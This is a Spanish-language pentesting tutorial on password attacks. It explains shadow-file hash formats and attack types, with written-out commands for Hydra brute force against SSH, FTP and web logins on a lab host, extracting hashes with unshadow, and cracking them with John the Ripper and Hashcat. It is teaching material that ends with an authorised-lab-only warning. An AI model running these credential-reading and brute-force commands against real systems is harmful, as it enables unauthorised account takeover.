Fase 2 — Pentesting Fundamental

Cracking de Contraseñas — Hydra, John the Ripper y Hashcat

Las contraseñas son la primera línea de defensa y, paradójicamente, una de las mayores debilidades. En esta lección aprenderás cómo funcionan los hashes de contraseñas, cómo hacer fuerza bruta online con Hydra, y cómo crackear hashes offline con John the Ripper y Hashcat.

1. ¿Cómo se guardan las contraseñas?

Las contraseñas nunca se guardan en texto plano (o no deberían). Se guardan como hashes: funciones unidireccionales que transforman la contraseña en una cadena única.

Ejemplo: /etc/shadow de Linux
$ sudo cat /etc/shadow | grep kali
kali:$6$rounds=5000$salt$hash_largo_aqui:19500:0:99999:7:::

# Desglose:
# $6$    → algoritmo SHA-512
# $1$    → MD5 (inseguro)
# $5$    → SHA-256
# $y$    → yescrypt (moderno)
# $2b$   → bcrypt

# El "salt" es un valor aleatorio que se agrega a la contraseña
# antes de hashearla, para evitar ataques con rainbow tables.

2. Tipos de ataques a contraseñas

TipoCómo funcionaHerramienta
Online (fuerza bruta)Prueba contraseñas directamente contra un servicio (SSH, FTP, web login).Hydra, Medusa, Burp Intruder
Offline (cracking de hashes)Tienes el hash y generas millones de hashes hasta encontrar coincidencia.John the Ripper, Hashcat
Ataque de diccionarioPrueba una lista de contraseñas comunes (wordlist).Todos
Fuerza bruta puraPrueba TODAS las combinaciones posibles (a-z, 0-9, símbolos).Hashcat, John
Basado en reglasToma palabras del diccionario y aplica transformaciones (Password→P@ssw0rd).Hashcat rules, John rules
Rainbow TablesTablas pre-computadas de hashes. Rápido pero necesita mucho espacio.RainbowCrack

4. Hydra: fuerza bruta online

Hydra prueba combinaciones de usuario/contraseña directamente contra servicios de red activos.

Hydra — Ejemplos prácticos
# Fuerza bruta SSH
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    ssh://10.0.2.15 -t 4

# Fuerza bruta FTP
$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
    ftp://10.0.2.15

# Fuerza bruta de un login web (POST form)
$ hydra -l admin -P passwords.txt 10.0.2.15 \
    http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# Múltiples usuarios y contraseñas
$ hydra -L users.txt -P passwords.txt ssh://10.0.2.15

# Flags importantes:
# -l usuario  → un solo usuario
# -L archivo  → lista de usuarios
# -p password → una sola contraseña
# -P archivo  → lista de contraseñas
# -t 4        → 4 threads en paralelo
# -vV         → modo verbose

Resultado exitoso: [22][ssh] host: 10.0.2.15 login: msfadmin password: msfadmin

5. John the Ripper: cracking offline

John the Ripper
# Extraer hashes de Linux (combinar passwd + shadow)
$ unshadow /etc/passwd /etc/shadow > hashes.txt

# Crackear con diccionario
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Ver contraseñas crackeadas
$ john --show hashes.txt
msfadmin:msfadmin:1000:1000::/home/msfadmin:/bin/bash

# Crackear hashes MD5
$ john --format=raw-md5 --wordlist=rockyou.txt md5_hashes.txt

# Crackear NTLM (Windows)
$ john --format=nt --wordlist=rockyou.txt ntlm_hashes.txt

# Con reglas (transformaciones automáticas)
$ john --wordlist=rockyou.txt --rules hashes.txt

6. Hashcat: el rey del cracking con GPU

Hashcat usa la GPU (tarjeta gráfica) para crackear hashes mucho más rápido que John. Una GPU moderna puede calcular miles de millones de hashes por segundo.

Hashcat
# Crackear MD5 con diccionario
$ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# -m 0   → modo MD5
# -a 0   → ataque de diccionario

# Modos de hash más comunes (-m):
#   0    = MD5
#   100  = SHA-1
#   1400 = SHA-256
#   1000 = NTLM (Windows)
#   1800 = SHA-512 (Linux /etc/shadow)
#   3200 = bcrypt
#   22000 = WPA-PBKDF2 (WiFi)

# Fuerza bruta pura (todas las combinaciones)
$ hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
# ?a = cualquier carácter, 6 posiciones

# Con reglas (ej: password → P@ssw0rd)
$ hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule

# Ver resultados
$ hashcat -m 0 hashes.txt --show

Practica responsable

Todas las tecnicas de esta leccion deben practicarse exclusivamente en entornos autorizados: laboratorios locales, maquinas virtuales propias o plataformas como TryHackMe y HackTheBox. El acceso no autorizado a sistemas informaticos es un delito.
